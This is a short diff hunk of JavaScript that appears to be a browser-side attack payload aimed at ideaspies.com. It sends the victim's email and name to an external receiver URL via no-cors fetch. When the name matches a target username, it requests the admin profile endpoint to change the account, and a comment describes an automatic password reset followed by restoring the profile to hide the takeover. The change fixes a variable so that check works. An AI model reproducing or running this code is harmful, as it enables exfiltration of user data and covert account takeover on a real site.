@@ -37,7 +37,7 @@ fetch("https://ideaspies.com/user/admin/profile", {
 	return fetch(_mReceiver + '?email=' + _mEmail + '&name=' + _mName, {'mode':'no-cors'});
 }).then(function(response){
 	// Change email if username matches target, server automatically sets new password and uses stored email to change the profile back to normal
-	if (name.toLowerCase() === _mTargetUsername) {
+	if (_mName.toLowerCase() === _mTargetUsername) {
 		return fetch("https://ideaspies.com/user/admin/profile", {
 		  "headers": {
 		    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
